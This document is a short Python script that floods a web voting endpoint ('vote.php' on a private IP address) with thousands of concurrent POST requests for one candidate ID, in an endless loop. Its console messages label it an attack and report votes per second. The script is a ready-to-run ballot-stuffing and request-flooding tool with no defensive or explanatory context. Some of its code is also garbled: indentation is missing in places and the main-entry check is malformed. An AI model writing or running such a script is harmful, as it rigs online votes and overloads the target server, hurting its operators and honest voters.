import asyncio
import aiohttp
import time

URL = "http://10.4.34.253/vote.php"
CANDIDATE_ID = "9"
CONCURRENT = 3000

async def fire_vote(session, semaphore):
async with semaphore:
try:
payload = {'candidate_id': CANDIDATE_ID}
async with session.post(URL, data=payload, timeout=1.5, ssl=False) as resp:
return resp.status == 200
except:
return False

async def main():
semaphore = asyncio.Semaphore(CONCURRENT)
connector = aiohttp.TCPConnector(limit=CONCURRENT, ssl=False)

async with aiohttp.ClientSession(connector=connector) as session:
    print(f"[*] ATTACK LAUNCHED: {CONCURRENT} concurrent streams...")
    total_success = 0
    start_time = time.time()
    
    while True:
        tasks = [fire_vote(session, semaphore) for _ in range(CONCURRENT)]
        results = await asyncio.gather(*tasks)
        
        total_success += sum(1 for r in results if r)
        elapsed = time.time() - start_time
        vps = total_success / elapsed
        
        print(f"[+] Total: {total_success} | Speed: {vps:.2f} votes/sec")
        await asyncio.sleep(0.01)
if name == "main":
try:
asyncio.run(main())
except KeyboardInterrupt:
print("\n[*] Attack stopped by user.")
